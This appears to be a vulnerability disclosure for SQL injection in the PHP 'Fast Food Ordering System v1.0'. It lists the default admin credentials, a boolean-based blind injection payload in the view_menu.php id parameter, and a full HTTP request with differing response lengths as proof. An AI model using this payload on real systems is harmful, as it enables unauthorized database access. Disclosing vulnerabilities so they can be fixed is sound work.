# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/admin/menus/view_menu.php?id=

Vulnerability location: /ffos/admin/menus/view_menu.php?id=, id

Current database name: ffos_db,length is 7

[+] Payload: /ffos/admin/menus/view_menu.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /ffos/admin/menus/view_menu.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
```

When length (database ()) = 6, Content-Length: 1015
![image](https://user-images.githubusercontent.com/54017627/171351708-f7a4f264-810d-4c16-9a6d-60b7eb0fbc38.png)

![image](https://user-images.githubusercontent.com/54017627/171351602-2a149785-786e-4ba8-9077-b8e349cfeaa1.png)

When length (database ()) = 7, Content-Length: 950
![image](https://user-images.githubusercontent.com/54017627/171351645-5d9ab154-f09a-43a5-984c-0e28b0edbba6.png)

![image](https://user-images.githubusercontent.com/54017627/171351460-18bbba42-791d-4c5a-b24f-de71de9ffbf2.png)
